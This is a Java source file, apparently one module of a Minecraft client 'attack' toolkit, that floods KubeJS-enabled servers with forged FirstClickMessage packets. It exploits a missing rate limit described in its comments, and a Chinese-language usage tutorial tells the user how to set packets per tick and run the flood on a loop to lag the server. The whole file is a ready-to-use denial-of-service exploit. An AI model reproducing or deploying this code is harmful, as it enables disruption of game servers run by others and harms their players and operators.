package com.redblue.red.modules.kubejs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * KJS-02: FirstClickMessage Flood — Script Execution DoS.
 *
 * VULN-07 (CONFIRMED via javap):
 * FirstClickMessage.handle() has NO rate limit or cooldown.
 * Each packet triggers server-side KubeJS script event execution:
 *   - type==0: ItemEvents.FIRST_LEFT_CLICKED (1 event per packet)
 *   - type==1: ItemEvents.FIRST_RIGHT_CLICKED (iterates ALL InteractionHand.values(),
 *              fires 2 events per packet: MAIN_HAND + OFF_HAND)
 *
 * No isAlive/isDeadOrDying check. No distance check (irrelevant).
 * Player identity from context.getPlayer() (correct, not spoofable).
 *
 * Wire format (Architectury on Forge):
 *   Vanilla channel: "architectury:network"
 *   Payload: ResourceLocation("kubejs:first_click") + Byte(type)
 */
public class KJS02_ClickFlood implements AttackModule {

    private static final ResourceLocation ARCH_CHANNEL =
            new ResourceLocation("architectury", "network");
    private static final ResourceLocation MSG_ID =
            new ResourceLocation("kubejs", "first_click");

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "\u26A0 确认：可能导致服务器卡顿", false),
        ConfigParam.ofEnum("click_type", "点击类型",
                "RIGHT", "LEFT", "RIGHT")
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("packets_per_tick", "每Tick发包数",
                50, 1, 500)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("interval", "Tick间隔", 1, 1, 20)
                .visibleWhen("confirm_danger", "true")
    );

    private long lastTickTime = 0;

    @Override public String id() { return "kjs02_clickflood"; }
    @Override public String name() { return "点击洪水"; }

    @Override
    public String description() {
        return "点击包洪水触发脚本执行导致服务器卡顿";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「\u26A0 确认」开关\n"
            + "2. 选择点击类型：RIGHT(右键)每包触发2次事件，LEFT(左键)触发1次\n"
            + "3. 设置每Tick发包数和间隔\n"
            + "4. 点击「执行」单次发送，或启用自动循环\n\n"
            + "[原理]\n"
            + "FirstClickMessage无速率限制，每个包都会在服务器主线程\n"
            + "触发KubeJS脚本事件执行。右键点击会遍历所有InteractionHand，\n"
            + "每包触发2次事件，效率更高。\n\n"
            + "[注意]\n"
            + "- 需要服务端安装KubeJS且注册了FIRST_LEFT/RIGHT_CLICKED事件\n"
            + "- 即使无事件监听器，hasListeners检查本身也消耗少量CPU";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("kubejs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!isConfirmed()) return;

        int count = getParam("packets_per_tick")
                .map(ConfigParam::getInt).orElse(50);
        sendBurst(count);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!isConfirmed()) return;

        int interval = getParam("interval")
                .map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTickTime < interval) return;
        lastTickTime = now;

        int count = getParam("packets_per_tick")
                .map(ConfigParam::getInt).orElse(50);
        sendBurst(count);
    }

    private boolean isConfirmed() {
        return getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
    }

    private void sendBurst(int count) {
        byte clickType = getClickType();
        for (int i = 0; i < count; i++) {
            PacketForge.send(ARCH_CHANNEL, buf -> {
                buf.writeResourceLocation(MSG_ID);
                buf.writeByte(clickType);
            });
        }
    }

    private byte getClickType() {
        String mode = getParam("click_type")
                .map(ConfigParam::getString).orElse("RIGHT");
        return "LEFT".equals(mode) ? (byte) 0 : (byte) 1;
    }
}
